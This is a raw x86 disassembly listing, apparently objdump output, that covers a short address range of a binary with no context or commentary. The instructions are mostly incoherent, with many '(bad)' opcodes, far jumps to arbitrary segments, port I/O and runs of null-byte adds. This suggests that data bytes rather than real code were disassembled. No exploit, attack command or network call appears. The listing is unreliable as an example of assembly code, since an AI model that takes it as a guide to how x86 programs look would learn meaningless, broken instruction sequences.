  43ee06:	inc    edx
  43ee07:	dec    esp
  43ee08:	xor    edi,DWORD PTR [esi+0x286c5ca1]
  43ee0e:	push   es
  43ee0f:	push   ss
  43ee10:	add    BYTE PTR [ebx-0x19],ah
  43ee13:	jae    0x43ee6a
  43ee15:	outs   dx,DWORD PTR ds:[esi]
  43ee16:	out    0x69,eax
  43ee18:	dec    esi
  43ee19:	ins    DWORD PTR es:[edi],dx
  43ee1a:	call   FWORD PTR [ebp+eax*2+0x0]
  43ee1e:	add    BYTE PTR [eax],al
  43ee20:	add    BYTE PTR [eax],al
  43ee22:	push   esp
  43ee23:	cmp    DWORD PTR [eax],eax
  43ee25:	add    BYTE PTR [ebp-0x24],dh
  43ee28:	and    BYTE PTR [ebp+0x0],bl
  43ee2b:	sti    
  43ee2c:	repnz sub eax,0x6c200d53
  43ee32:	jne    0x43ee5b
  43ee34:	std    
  43ee35:	cmp    al,0xe7
  43ee37:	push   cs
  43ee38:	sbb    eax,0x37fcd074
  43ee3d:	outs   dx,BYTE PTR ds:[esi]
  43ee3e:	fmul   st,st(2)
  43ee40:	sbb    DWORD PTR [ecx-0x35],ecx
  43ee43:	push   ecx
  43ee44:	inc    edi
  43ee45:	ins    BYTE PTR es:[edi],dx
  43ee46:	loop   0x43ee13
  43ee48:	sbb    eax,0xfca1756c
  43ee4d:	cmp    al,0xb1
  43ee4f:	jl     0x43ee86
  43ee51:	inc    esp
  43ee52:	mov    bl,0x5b
  43ee54:	pop    ds
  43ee55:	imul   eax,esi,0x5d
  43ee58:	xor    ah,BYTE PTR [edi-0x65]
  43ee5b:	enter  0x76fc,0x74
  43ee5f:	pop    esp
  43ee60:	xor    BYTE PTR [esi-0x74],ch
  43ee63:	(bad)  
  43ee64:	daa    
  43ee65:	inc    edx
  43ee66:	xchg   DWORD PTR [eax+0x62a04119],ecx
  43ee6c:	inc    eax
  43ee6d:	cs jne 0x43eee1
  43ee70:	cld    
  43ee71:	cmp    al,0x8a
  43ee73:	jne    0x43ee92
  43ee75:	ins    DWORD PTR es:[edi],dx
  43ee76:	pop    esi
  43ee77:	and    WORD PTR [ebx+0x33],bp
  43ee7b:	sbb    esp,DWORD PTR [edx]
  43ee7d:	arpl   WORD PTR [ebp-0x67],si
  43ee80:	cld    
  43ee81:	cmp    al,0x4a
  43ee83:	in     al,dx
  43ee84:	sub    eax,0x63
  43ee89:	add    BYTE PTR [eax],al
  43ee8b:	push   esp
  43ee8c:	cmp    eax,0x3c5b4727
  43ee91:	cmp    BYTE PTR [edi+0x53],bl
  43ee94:	dec    esp
  43ee95:	daa    
  43ee96:	add    BYTE PTR [ebp+0x4d],dh
  43ee99:	add    al,0x3d
  43ee9b:	and    bh,dh
  43ee9d:	sbb    DWORD PTR [edi+0x1b],esp
  43eea0:	inc    edx
  43eea1:	cmp    BYTE PTR [edi+0x14],ah
  43eea4:	add    dl,BYTE PTR [ebx]
  43eea6:	sbb    eax,0x3e72523
  43eeab:	xor    eax,0x321f2602
  43eeb0:	xor    BYTE PTR [eax],al
  43eeb2:	cmp    BYTE PTR [edx],bl
  43eeb4:	and    DWORD PTR [ebx],edx
  43eeb6:	sbb    eax,0x29162503
  43eebb:	rcl    BYTE PTR [edi],1
  43eebd:	cmc    
  43eebe:	sbb    al,0xe1
  43eec0:	sbb    esp,edi
  43eec2:	add    ebx,DWORD PTR [edx+eax*1+0x2cb21ea6]
  43eec9:	shl    BYTE PTR [edi],1
  43eecb:	fisub  DWORD PTR [ebx]
  43eecd:	ret    
  43eece:	sbb    al,0xc3
  43eed0:	daa    
  43eed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43eed2:	sub    esi,DWORD PTR [ebp+0x2]
  43eed5:	mov    BYTE PTR [ebx],0x78
  43eed8:	sub    eax,0x32a92896
  43eedd:	mov    ch,0x1e
  43eedf:	lods   eax,DWORD PTR ds:[esi]
  43eee0:	sbb    esp,DWORD PTR [ebp-0x71d33de1]
  43eee6:	sub    BYTE PTR [ecx-0x69e075fe],ah
  43eeec:	rcl    esp,1
  43eeee:	fld    QWORD PTR [eax]
  43eef0:	add    BYTE PTR [eax],al
  43eef2:	add    BYTE PTR [eax],al
  43eef4:	xchg   esi,eax
  43eef5:	cs jnp 0x43eefb
  43eef8:	dec    esp
  43eef9:	add    ah,BYTE PTR [esi+0x73239631]
  43eeff:	sub    BYTE PTR [eax+0x4a33842d],dh
  43ef05:	push   ss
  43ef06:	and    BYTE PTR [ecx],0x51
  43ef09:	daa    
  43ef0a:	and    eax,0x482f611d
  43ef0f:	xor    al,0x75
  43ef11:	add    cl,cl
  43ef13:	add    esi,DWORD PTR [ecx]
  43ef15:	daa    
  43ef16:	cmp    ebp,DWORD PTR [ecx]
  43ef18:	dec    ecx
  43ef19:	daa    
  43ef1a:	xor    ah,BYTE PTR [edx]
  43ef1c:	push   ebx
  43ef1d:	daa    
  43ef1e:	inc    esi
  43ef1f:	cmp    BYTE PTR [ebp+0x2],dh
  43ef22:	add    BYTE PTR [ebx+0x35634371],ah
  43ef28:	sub    eax,0x5d103e45
  43ef2d:	das    
  43ef2e:	add    ah,dl
  43ef30:	jbe    0x43ef11
  43ef32:	ins    DWORD PTR es:[edi],dx
  43ef33:	or     al,0x50
  43ef35:	push   ss
  43ef36:	arpl   WORD PTR ds:0xc4cdc40,sp
  43ef3c:	push   esi
  43ef3d:	push   ss
  43ef3e:	addr16 push cs
  43ef40:	xchg   ebx,eax
  43ef41:	add    al,BYTE PTR [eax]
  43ef43:	(bad)  
  43ef44:	je     0x43ef95
  43ef46:	arpl   bp,di
  43ef48:	lea    edi,[edi]
  43ef4a:	je     0x43ef02
  43ef4c:	xchg   esp,eax
  43ef4d:	and    al,0x63
  43ef4f:	retf   0x28a
  43ef52:	add    BYTE PTR [edx],ah
  43ef54:	jno    0x43ef99
  43ef56:	arpl   bp,dx
  43ef58:	add    BYTE PTR [eax],al
  43ef5a:	add    BYTE PTR [eax],al
  43ef5c:	add    BYTE PTR [edx-0x682f8ddf],bh
  43ef62:	and    DWORD PTR ds:0x2f66c8,edi
  43ef68:	shl    BYTE PTR [esp+ecx*2+0x63],0xba
  43ef6d:	push   0x2b
  43ef6f:	outs   dx,BYTE PTR ds:[esi]
  43ef70:	mov    WORD PTR [edx+0x7498ffdf],?
  43ef76:	dec    edi
  43ef77:	pop    edi
  43ef78:	lahf   
  43ef79:	pop    ebp
  43ef7a:	inc    esi
  43ef7b:	cmp    eax,0xffd276e9
  43ef80:	test   eax,0x755f2144
  43ef85:	popf   
  43ef86:	fild   QWORD PTR [eax-0x7c]
  43ef89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ef8a:	cmp    eax,0x2e948074
  43ef8f:	arpl   WORD PTR ds:0x89000234,bp
  43ef95:	ja     0x43efe6
  43ef97:	arpl   WORD PTR [ebp+0x27],bx
  43ef9a:	and    DWORD PTR [ebp+0x55],ebx
  43ef9d:	daa    
  43ef9e:	and    ebp,DWORD PTR [edx+0x0]
  43efa1:	int3   
  43efa2:	add    BYTE PTR [ebp+0x1],ch
  43efa5:	pop    ebx
  43efa6:	jmp    0x686a:0xd5304660
  43efad:	mov    WORD PTR [eax],es
  43efaf:	fild   DWORD PTR [eax]
  43efb1:	dec    eax
  43efb2:	in     eax,0x6b
  43efb4:	gs push 0x9c4343e5
  43efba:	add    BYTE PTR [ecx+0x73e53f02],ah
  43efc0:	push   esi
  43efc1:	add    BYTE PTR [eax],al
  43efc3:	add    BYTE PTR [eax],al
  43efc5:	add    BYTE PTR [ebp-0x1b],ah
  43efc8:	outs   dx,BYTE PTR ds:[esi]
  43efc9:	jo     0x43ef4e
  43efcb:	shl    BYTE PTR [ebx+0x4f],1
  43efce:	outs   dx,BYTE PTR ds:[esi]
  43efcf:	out    0x3c,eax
  43efd1:	js     0x43f01f
  43efd3:	add    BYTE PTR [edx],ch
  43efd5:	add    BYTE PTR [edi],cl
  43efd7:	rcr    BYTE PTR [ecx+eiz*2+0x28],cl
  43efdb:	in     eax,0x43
  43efdd:	inc    ebx
  43efde:	or     eax,DWORD PTR [eax]
  43efe0:	or     eax,DWORD PTR [eax]
  43efe2:	push   cs
  43efe3:	stc    
  43efe4:	jae    0x43f028
  43efe6:	and    ah,dl
  43efe8:	(bad)  
  43efe9:	(bad)  
  43efea:	fild   DWORD PTR [ebx+0x41]
  43efed:	xor    ebp,DWORD PTR [esi]
  43efef:	mov    esi,0xffe06c5c
  43eff4:	xchg   DWORD PTR [eax],eax
  43eff6:	jmp    0x63e3:0xfd655cd1
  43effd:	jb     0x43eff4
  43efff:	std    
  43f000:	pop    ebp
  43f001:	outs   dx,DWORD PTR ds:[esi]
  43f002:	or     al,0x0
  43f004:	add    DWORD PTR [eax],0x6173e4eb
  43f00a:	clc    
  43f00b:	jecxz  0x43f076
  43f00d:	imul   esi,edx,0xc20066e5
  43f013:	dec    DWORD PTR [esi+0x53]
  43f016:	lea    edi,[edi]
  43f018:	fs fs cs jecxz 0x43f087
  43f01d:	jae    0x43f094
  43f01f:	fstp   QWORD PTR [edx]
  43f021:	dec    ebp
  43f022:	dec    ecx
  43f023:	aaa    
  43f024:	adc    eax,0x3ea526a
  43f029:	and    BYTE PTR [eax],al
  43f02b:	add    BYTE PTR [eax],al
  43f02d:	add    BYTE PTR [eax],al
  43f02f:	jne    0x43f025
  43f031:	dec    esi
  43f032:	aas    
  43f033:	xlat   BYTE PTR ss:[ebx]
  43f035:	and    BYTE PTR [edi+0x29],bl
  43f038:	inc    esi
  43f039:	inc    ecx
  43f03a:	jb     0x43f04c
  43f03c:	repz aaa 
  43f03e:	add    BYTE PTR [ebp-0x51],dh
  43f041:	cld    
  43f042:	push   eax
  43f043:	es jmp 0x4d30:0x9b187240
  43f04b:	adc    ch,dh
  43f04d:	and    BYTE PTR [ebp-0x17],bl
  43f050:	test   eax,0xfc7520fc
  43f055:	dec    esi
  43f056:	aas    
  43f057:	mov    eax,0xab6b319b
  43f05c:	into   
  43f05d:	xor    BYTE PTR [ecx-0x1e],dh
  43f060:	mov    bh,0x17
  43f062:	inc    ebx
  43f063:	ret    
  43f064:	into   
  43f065:	sbb    dh,BYTE PTR [esi+eax*8-0x57]
  43f069:	cld    
  43f06a:	xor    DWORD PTR [ebp+0x7c],esi
  43f06d:	dec    edi
  43f06e:	aas    
  43f06f:	mov    esp,0x99741fcc
  43f074:	test   eax,0x747514fc
  43f079:	dec    edi
  43f07a:	aas    
  43f07b:	mov    dh,0x75
  43f07d:	sbb    ebp,DWORD PTR [ebp-0x68]
  43f080:	data16 xor ah,BYTE PTR [ebx-0x65]
  43f084:	jge    0x43f082
  43f086:	inc    esi
  43f087:	jne    0x43f0dd
  43f089:	dec    edi
  43f08a:	aas    
  43f08b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f08c:	mov    ds,WORD PTR [edx]
  43f08e:	fs jne 0x43f0f6
  43f091:	cld    
  43f092:	push   eax
  43f093:	add    BYTE PTR [eax],al
  43f095:	add    BYTE PTR [eax],al
  43f097:	add    BYTE PTR [esi+0x6a],al
  43f09a:	dec    esi
  43f09b:	arpl   WORD PTR [esi+0x13],dx
  43f09e:	std    
  43f09f:	push   eax
  43f0a0:	inc    esi
  43f0a1:	add    dl,BYTE PTR ds:0x8d0a04b
  43f0a7:	and    BYTE PTR [ecx+0x2e],bl
  43f0aa:	out    0x3,eax
  43f0ac:	bound  eax,QWORD PTR [edx]
  43f0ae:	and    DWORD PTR es:[ebx+0x16],ecx
  43f0b2:	sub    esp,DWORD PTR [ecx]
  43f0b4:	and    DWORD PTR ds:0x25682133,esp
  43f0ba:	xor    eax,0x40241a30
  43f0bf:	daa    
  43f0c0:	cmp    dl,BYTE PTR [esi]
  43f0c2:	or     al,0x42
  43f0c4:	and    ebp,DWORD PTR [ebx]
  43f0c6:	or     al,0x57
  43f0c8:	add    DWORD PTR [ebx],ebp
  43f0ca:	adc    eax,0x30027521
  43f0cf:	add    al,0x38
  43f0d1:	and    eax,0x12bc2ff5
  43f0d6:	add    al,0x1a
  43f0d8:	mov    eax,0xd62ff61b
  43f0dd:	daa    
  43f0de:	push   ss
  43f0df:	xor    ah,cl
  43f0e1:	adc    al,0xcc
  43f0e3:	push   edx
  43f0e4:	jne    0x43f0e8
  43f0e6:	cmc    
  43f0e7:	add    ecx,DWORD PTR [eax-0x7fd02ae1]
  43f0ed:	es mov edx,0xbb35d636
  43f0f3:	sbb    ah,BYTE PTR [ebx-0x7bfc18e1]
  43f0f9:	add    edx,DWORD PTR [edi+0x41]
  43f0ff:	add    BYTE PTR [eax],al
  43f101:	mov    ebp,0x8c33bc4b
  43f106:	adc    al,0x9b
  43f108:	inc    esi
  43f109:	xchg   esi,eax
  43f10a:	adc    al,0x93
  43f10c:	push   esi
  43f10d:	sub    DWORD PTR [ecx],0x2752095
  43f113:	mov    ebx,0x751f3803
  43f118:	das    
  43f119:	sub    BYTE PTR ss:[eax+ebx*1-0x58],dh
  43f11e:	pop    ds
  43f11f:	add    BYTE PTR [ebx-0x6e],bh
  43f122:	and    DWORD PTR [edx-0x80],esp
  43f125:	xchg   ebx,eax
  43f126:	cmp    DWORD PTR [esp+ecx*2-0x76],esi
  43f12a:	inc    ecx
  43f12b:	push   0x3a
  43f12d:	test   DWORD PTR [ebx],ebp
  43f12f:	outs   dx,BYTE PTR ds:[esi]
  43f130:	dec    esp
  43f131:	jns    0x43f118
  43f133:	jmp    FWORD PTR [ecx]
  43f135:	xchg   esp,eax
  43f136:	sub    BYTE PTR [ebp+ebp*1+0x64],dh
  43f13a:	adc    ch,BYTE PTR [eax+edx*2+0x52]
  43f13e:	cmp    DWORD PTR [esp+ecx*2+0x3a],esi
  43f142:	and    eax,0x2478356e
  43f147:	or     bl,BYTE PTR [bx+si+0xe]
  43f14b:	arpl   WORD PTR [edx],bp
  43f14d:	outs   dx,BYTE PTR ds:[esi]
  43f14e:	sub    al,0x74
  43f150:	or     al,0x51
  43f152:	push   cs
  43f153:	add    bh,dh
  43f155:	jno    0x43f189
  43f157:	inc    edx
  43f158:	and    DWORD PTR [edx+ebx*1+0xea30e70],esi
  43f15f:	cmp    eax,0x4d0eab0c
  43f164:	cmc    
  43f165:	add    BYTE PTR [eax],al
  43f167:	add    BYTE PTR [eax],al
  43f169:	add    BYTE PTR [edi+0x28],bh
  43f16c:	arpl   WORD PTR [esi+ebx*4+0x76420002],bp
  43f173:	xlat   BYTE PTR ds:[ebx]
  43f174:	ins    DWORD PTR es:[edi],dx
  43f175:	rol    BYTE PTR [esi-0x7940acf2],1
  43f17b:	sub    BYTE PTR [ecx-0x43],ch
  43f17e:	push   ebp
  43f17f:	aaa    
  43f180:	je     0x43f127
  43f182:	push   ecx
  43f183:	push   cs
  43f184:	pop    edi
  43f185:	jmp    0x9091c900
  43f18a:	(bad)  
  43f18b:	cs sub eax,0x6c252cdb
  43f191:	lea    esi,[esi+0x27]
  43f194:	add    BYTE PTR [eax-0x649cf1a4],ah
  43f19a:	pop    esp
  43f19b:	and    eax,0xcf1f0074
  43f1a0:	pop    eax
  43f1a1:	arpl   WORD PTR [edi],ax
  43f1a3:	xor    ch,BYTE PTR [edx+0x6c]
  43f1a6:	or     eax,0x14005105
  43f1ab:	jmp    0xe9d16223
  43f1b0:	pop    esp
  43f1b1:	jb     0x43f208
  43f1b3:	frstor [ebp+0x66]
  43f1b6:	cmp    eax,DWORD PTR [ebp+0x0]
  43f1b9:	add    BYTE PTR ds:0x706e40fe,bl
  43f1bf:	stc    
  43f1c0:	imul   ebp,DWORD PTR [esi+0x31],0x3a6f3ad2
  43f1c7:	cld    
  43f1c8:	pop    esp
  43f1c9:	arpl   WORD PTR [eax+0x45],sp
  43f1cc:	add    BYTE PTR [eax],al
  43f1ce:	add    BYTE PTR [eax],al
  43f1d0:	add    BYTE PTR [eax],al
  43f1d2:	add    BYTE PTR [ebx-0x2],dl
  43f1d5:	inc    edi
  43f1d6:	je     0x43f238
  43f1d8:	into   
  43f1d9:	inc    esi
  43f1da:	jo     0x43f24d
  43f1dc:	cld    
  43f1dd:	dec    ecx
  43f1de:	gs pop ebp
  43f1e0:	jmp    0x45b46541
  43f1e5:	add    BYTE PTR [eax],al
  43f1e7:	mov    ?,esi
  43f1e9:	inc    edi
  43f1ea:	je     0x43f24c
  43f1ec:	aam    0x38
  43f1ee:	fs jo  0x43f221
  43f1f1:	pop    ebp
  43f1f2:	jno    0x43f225
  43f1f4:	stc    
  43f1f5:	push   0x74
  43f1f7:	add    al,0xf9
  43f1f9:	pop    eax
  43f1fa:	fs xor esi,ecx
  43f1fd:	push   0x41
  43f1ff:	dec    esp
  43f200:	add    al,0x53
  43f202:	add    ah,ah
  43f204:	out    0x73,eax
  43f206:	jo     0x43f217
  43f208:	stc    
  43f209:	gs fs (bad) 
  43f20c:	clc    
  43f20d:	push   0x73cf3175
  43f212:	inc    ecx
  43f213:	sbb    al,0x4
  43f215:	pop    DWORD PTR [eax]
  43f217:	(bad)  
  43f21a:	gs jne 0x43f298
  43f21d:	push   ss
  43f21e:	arpl   WORD PTR [ecx+0x63632c78],ax
  43f224:	push   0xfffffffc
  43f226:	fs jne 0x43f27b
  43f229:	push   ss
  43f22a:	je     0x43f284
  43f22c:	sbb    edx,DWORD PTR [edi]
  43f22e:	arpl   WORD PTR [ecx+0x6c],sp
  43f231:	adc    BYTE PTR [ecx+0x46],ch
  43f234:	inc    esi
  43f235:	cmp    al,0x5f
  43f237:	add    BYTE PTR [eax],al
  43f239:	add    BYTE PTR [eax],al
  43f23b:	add    BYTE PTR [ebx+0x3d],bl
  43f23e:	sbb    BYTE PTR [ebx+0x75],ah
  43f241:	int    0x3
  43f243:	dec    eax
  43f244:	inc    ecx
  43f245:	sub    eax,0x2f184d34
  43f24a:	and    BYTE PTR [esi+0x10],cl
  43f24d:	fisubr DWORD PTR [eax]
  43f24f:	arpl   WORD PTR [esi],sp
  43f251:	aad    0x38
  43f253:	js     0x43f289
  43f255:	test   eax,0xd1755afc
  43f25a:	das    
  43f25b:	je     0x43f262
  43f25d:	fcomp  QWORD PTR [eax]
  43f25f:	push   0x19
  43f261:	fistp  DWORD PTR [eax]
  43f263:	outs   dx,DWORD PTR ds:[esi]
  43f264:	add    dh,bh
  43f266:	xor    dh,BYTE PTR [eax+edi*4+0x1]
  43f26a:	dec    edi
  43f26b:	add    BYTE PTR [ebp-0x24],dh
  43f26e:	cld    
  43f26f:	inc    esi
  43f270:	rcl    DWORD PTR [ebp-0x13491e7],cl
  43f276:	das    
  43f277:	dec    ebp
  43f278:	fdiv   DWORD PTR [ebp-0x522b8bad]
  43f27e:	sub    DWORD PTR [ebp-0x4a],ebp
  43f281:	retf   0x6c10
  43f284:	xlat   BYTE PTR ds:[ebx]
  43f285:	retf   0x6523
  43f288:	mov    ah,0xa9
  43f28a:	cld    
  43f28b:	xchg   esp,eax
  43f28c:	jne    0x43f2e0
  43f28e:	push   ss
  43f28f:	je     0x43f229
  43f291:	pop    ebx
  43f292:	push   ss
  43f293:	arpl   WORD PTR [ecx-0x789cd686],sp
  43f299:	add    ah,BYTE PTR [eax-0x77f155c1]
  43f29f:	inc    edx
  43f2a0:	add    BYTE PTR [eax],al
  43f2a2:	add    BYTE PTR [eax],al
  43f2a4:	add    BYTE PTR [edi-0x65e87fdf],al
  43f2aa:	and    al,0x7b
  43f2ac:	push   ds
  43f2ad:	jne    0x43f2b1
  43f2af:	inc    edi
  43f2b0:	add    esi,DWORD PTR [edx]
  43f2b2:	sub    BYTE PTR [ebx+0x1e],dh
  43f2b5:	push   ebx
  43f2b6:	sub    BYTE PTR [edi+ebp*1+0x1f881d2b],cl
  43f2bd:	aaa    
  43f2be:	sub    DWORD PTR [ebx+0x21],edx
  43f2c1:	sbb    ch,BYTE PTR ss:[eax]
  43f2c4:	add    al,0xdc
  43f2c6:	add    DWORD PTR [eax],esp
  43f2c8:	push   ss
  43f2c9:	inc    ecx
  43f2ca:	sbb    eax,0xe161655
  43f2cf:	adc    eax,0x211e4a21
  43f2d4:	sbb    eax,0x3e71d11
  43f2d9:	leave  
  43f2da:	add    DWORD PTR [eax],esp
  43f2dc:	push   ss
  43f2dd:	or     DWORD PTR ds:0xe161615,ebx
  43f2e3:	and    DWORD PTR ss:[ecx],ecx
  43f2e6:	inc    edi
  43f2e7:	pop    ss
  43f2e8:	xor    BYTE PTR [edx],dl
  43f2ea:	daa    
  43f2eb:	stc    
  43f2ec:	inc    esp
  43f2ed:	jne    0x43f2f1
  43f2ef:	and    DWORD PTR [edi*4-0x4fcc0cf2],eax
  43f2f6:	pop    ds
  43f2f7:	add    DWORD PTR [eax],esp
  43f2f9:	stos   DWORD PTR es:[edi],eax
  43f2fa:	pop    ds
  43f2fb:	clc    
  43f2fc:	xor    dh,dl
  43f2fe:	adc    ebx,ebx
  43f300:	dec    esi
  43f301:	jne    0x43f305
  43f303:	mov    ds:0xdb1fb403,eax
  43f308:	push   eax
  43f309:	add    BYTE PTR [eax],al
  43f30b:	add    BYTE PTR [eax],al
  43f30d:	add    bl,cl
  43f30f:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  43f311:	and    al,0xd0
  43f313:	sub    cl,ah
  43f315:	inc    eax
  43f316:	lahf   
  43f317:	push   cs
  43f318:	mov    ch,0x2c
  43f31a:	mov    edx,0x83cf0024
  43f31f:	xor    eax,DWORD PTR [eax]
  43f321:	jne    0x43f39c
  43f323:	cmp    eax,0x24559d6a
  43f328:	push   0xffffff84
  43f32a:	push   edx
  43f32b:	inc    edi
  43f32c:	arpl   WORD PTR [ebp-0x6aa0f159],bx
  43f332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f333:	daa    
  43f334:	cmp    eax,0x5e268288
  43f339:	mov    BYTE PTR [edi+0x76e9511f],dl
  43f33f:	inc    edi
  43f340:	add    BYTE PTR [ecx+0x28700ea2],ah
  43f346:	xchg   ebp,eax
  43f347:	push   ds
  43f348:	dec    esi
  43f349:	inc    esp
  43f34a:	mov    BYTE PTR [ecx],dl
  43f34c:	arpl   WORD PTR [edx-0x7b],bx
  43f34f:	dec    edx
  43f350:	arpl   WORD PTR [eax+0x55],cx
  43f353:	and    DWORD PTR [esi+0x3a],ebp
  43f356:	cmp    al,BYTE PTR [edx]
  43f358:	add    BYTE PTR [esi+esi*2+0x3d],bl
  43f35c:	push   0x3d
  43f35e:	push   esp
  43f35f:	and    al,0x6a
  43f361:	inc    esp
  43f362:	inc    ebp
  43f363:	inc    ebp
  43f364:	jae    0x43f372
  43f366:	inc    edi
  43f367:	or     eax,0x1d451949
  43f36c:	imul   eax,DWORD PTR [edi],0x6f000230
  43f372:	add    BYTE PTR [eax],al
  43f374:	add    BYTE PTR [eax],al
  43f376:	add    BYTE PTR [esi+0x3d],dh
  43f379:	push   0xfffffffd
  43f37b:	xchg   ebp,eax
  43f37c:	and    al,0x6a
  43f37e:	add    al,0xa5
  43f380:	inc    ebp
  43f381:	jae    0x43f38f
  43f383:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f384:	or     eax,0x1da2f949
  43f389:	imul   edx,edi,0x850002bb
  43f38f:	jbe    0x43f3ce
  43f391:	push   0xffffffdd
  43f393:	xchg   ebp,eax
  43f394:	and    al,0x6a
  43f396:	les    esp,FWORD PTR [edx+0x47]
  43f399:	arpl   WORD PTR [eax],ax
  43f39b:	call   0x47b35adf
  43f3a0:	neg    BYTE PTR [ecx+eax*2+0xc]
  43f3a4:	add    DWORD PTR [edi+0x49],ecx
  43f3a7:	repnz aad 0x45
  43f3aa:	inc    ebp
  43f3ab:	enter  0x5cae,0x6c
  43f3af:	lock add BYTE PTR [edi+0x4c],al
  43f3b3:	leave  
  43f3b4:	cmp    eax,0x92cf544d
  43f3b9:	es fs add ch,ch
  43f3bd:	(bad)  
  43f3be:	jmp    ebx
  43f3c0:	inc    DWORD PTR [ebp+0x65]
  43f3c3:	pop    eax
  43f3c4:	xor    ch,BYTE PTR [ebx+0x65]
  43f3c7:	dec    esi
  43f3c8:	aam    0x5c
  43f3ca:	je     0x43f351
  43f3cc:	in     al,dx
  43f3cd:	pop    ebp
  43f3ce:	outs   dx,DWORD PTR ds:[esi]
  43f3cf:	int3   
  43f3d0:	add    BYTE PTR [ebp+0x0],bl
  43f3d3:	xchg   edx,eax
  43f3d4:	cmc    
  43f3d5:	jae    0x43f418
  43f3d7:	dec    esp
  43f3d8:	stc    
  43f3d9:	cmp    DWORD PTR [ebp+0x0],esi
  43f3dc:	add    BYTE PTR [eax],al
  43f3de:	add    BYTE PTR [eax],al
  43f3e0:	cmp    dh,ah
  43f3e2:	pop    esp
  43f3e3:	jb     0x43f43f
  43f3e5:	rcr    BYTE PTR [ebp+eiz*2-0x74],1
  43f3e9:	add    ch,dh
  43f3eb:	add    BYTE PTR [edx-0xb],dh
  43f3ee:	jae    0x43f445
  43f3f0:	outs   dx,DWORD PTR ds:[esi]
  43f3f1:	cmc    
  43f3f2:	imul   eax,DWORD PTR [ebp+0x72],0x520064e5
  43f3f9:	aad    0x53
  43f3fb:	inc    ecx
  43f3fc:	lods   al,BYTE PTR ds:[esi]
  43f3fd:	xlat   BYTE PTR ds:[ebx]
  43f3fe:	sub    dh,BYTE PTR [edx]
  43f400:	inc    edx
  43f401:	hlt    
  43f402:	imul   ebp,DWORD PTR [esp+ecx*2+0x0],0x36
  43f407:	add    BYTE PTR [ebx+0x784173f3],cl
  43f40d:	fild   QWORD PTR [edi+0x74]
  43f410:	cmp    edx,edx
  43f412:	push   0x41
  43f414:	cmp    ah,dh
  43f416:	imul   esp,DWORD PTR [ebp+0x75],0xa6632fb8
  43f41d:	test   eax,0x51c546fc
  43f422:	xor    BYTE PTR [eax-0x4c],dl
  43f425:	jns    0x43f45c
  43f427:	sub    dh,BYTE PTR [ecx+0x7500305d]
  43f42d:	imul   edi,ebp,0x58
  43f430:	nop
  43f431:	ja     0x43f461
  43f433:	push   0xffffff92
  43f435:	test   eax,0x7e71e5fc
  43f43a:	sbb    DWORD PTR [ebx+0x56],ebp
  43f43d:	jns    0x43f464
  43f43f:	add    BYTE PTR [ebp-0x15],dh
  43f442:	jmp    FWORD PTR [edx+0x0]
  43f445:	add    BYTE PTR [eax],al
  43f447:	add    BYTE PTR [eax],al
  43f449:	pop    eax
  43f44a:	xchg   BYTE PTR [edi],ch
  43f44c:	arpl   WORD PTR [ecx-0x57],sp
  43f44f:	cld    
  43f450:	sti    
  43f451:	ja     0x43f3d7
  43f453:	sub    al,0x73
  43f455:	inc    edi
  43f456:	inc    esi
  43f457:	pop    ds
  43f458:	pop    edi
  43f459:	push   ecx
  43f45a:	inc    ebp
  43f45b:	add    al,0xe7
  43f45d:	jno    0x43f49d
  43f45f:	sbb    DWORD PTR [ebx+0x16],ebp
  43f462:	(bad)  
  43f463:	xor    eax,DWORD PTR [eax]
  43f465:	jne    0x43f482
  43f467:	add    BYTE PTR [ecx+0x28],bl
  43f46a:	inc    ebp
  43f46b:	xor    BYTE PTR [ecx+0x22],ch
  43f46e:	test   eax,0xd679ebfc
  43f473:	sbb    BYTE PTR [ebx+0x18],ch
  43f476:	in     al,dx
  43f477:	sub    DWORD PTR [ebx+0x75],esp
  43f47a:	(bad)  
  43f47b:	stc    
  43f47c:	ins    BYTE PTR es:[edi],dx
  43f47d:	add    edi,esi
  43f47f:	push   ds
  43f480:	imul   esp,ebp,0xffffffa9
  43f483:	cld    
  43f484:	out    0x71,eax
  43f486:	out    dx,al
  43f487:	sbb    BYTE PTR [ebx-0x2a],ch
  43f48a:	icebp  
  43f48b:	sub    eax,0xf8947500
  43f490:	pop    esi
  43f491:	xlat   BYTE PTR ds:[ebx]
  43f492:	cwde   
  43f493:	cld    
  43f494:	fwait
  43f495:	jbe    0x43f499
  43f497:	ret    0xd12e
  43f49a:	push   cs
  43f49b:	retf   0x7522
  43f49e:	add    ah,BYTE PTR [ecx]
  43f4a0:	add    ah,cl
  43f4a2:	or     al,0xd6
  43f4a4:	adc    eax,0x1ab512a4
  43f4a9:	(bad)  
  43f4aa:	push   cs
  43f4ab:	rol    DWORD PTR [ebx],0x0
  43f4ae:	add    BYTE PTR [eax],al
  43f4b0:	add    BYTE PTR [eax],al
  43f4b2:	sub    eax,0xa02d91ff
  43f4b7:	and    al,0xb7
  43f4b9:	xor    DWORD PTR [edx+0x751d9b24],edx
  43f4bf:	add    dl,BYTE PTR [eax-0x64f46201]
  43f4c5:	adc    al,0x5a
  43f4c7:	add    bh,BYTE PTR [eax+esi*1+0x67]
  43f4cb:	pop    ds
  43f4cc:	jne    0x43f4fd
  43f4ce:	(bad)  
  43f4cf:	push   ds
  43f4d0:	mov    edx,DWORD PTR [edi]
  43f4d2:	jne    0x43f4d6
  43f4d4:	mov    edi,edi
  43f4d6:	inc    ecx
  43f4d7:	sbb    eax,0x26523d73
  43f4dc:	dec    esp
  43f4dd:	xor    al,0x4c
  43f4df:	sub    DWORD PTR [ecx+0x18],ecx
  43f4e2:	push   esi
  43f4e3:	adc    bh,ah
  43f4e5:	add    edi,edx
  43f4e7:	(bad)  
  43f4e8:	sbb    DWORD PTR [ecx],ebx
  43f4ea:	and    DWORD PTR [edx],edx
  43f4ec:	cmp    al,0x18
  43f4ee:	cmp    DWORD PTR ds:0x2f141945,ebx
  43f4f4:	cmp    edx,DWORD PTR [esi]
  43f4f6:	sbb    ah,BYTE PTR [edx+eax*2]
  43f4f9:	inc    ebp
  43f4fa:	jne    0x43f4fe
  43f4fc:	inc    DWORD PTR [edi]
  43f4fe:	xor    ecx,DWORD PTR [esi]
  43f500:	or     edi,DWORD PTR [ecx]
  43f502:	ud2    
  43f504:	add    BYTE PTR [edx],dh
  43f506:	fld    DWORD PTR [edx]
